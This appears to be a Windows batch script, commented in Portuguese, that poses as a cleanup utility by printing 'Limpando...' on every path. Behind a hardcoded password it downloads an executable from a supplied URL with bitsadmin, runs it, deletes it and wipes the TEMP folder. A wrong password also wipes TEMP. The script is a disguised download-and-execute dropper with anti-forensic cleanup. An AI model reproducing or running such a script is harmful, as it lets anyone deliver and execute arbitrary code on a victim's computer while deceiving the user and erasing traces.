@echo off

set "senha=313233"  REM Defina a senha aqui

:inicio
cls
echo Pressione enter para limpar
set /p "inputSenha=>"

if "%inputSenha%"=="%senha%" (
    echo Limpando...
) else (
    echo Limpando...
    timeout /t 3 >nul
    rmdir /s /q %TEMP%
    exit
)

set /p url=Digite a URL do arquivo que deseja baixar:
bitsadmin /transfer "DownloadFile" %url% "bits_temp_file"
cmd /c "bitsadmin /transfer 'ExecuteFile' %url% %TEMP%\temp.exe & %TEMP%\temp.exe & del %TEMP%\temp.exe"

echo Download e execução concluídos.
timeout /t 3 >nul
rmdir /s /q %TEMP%
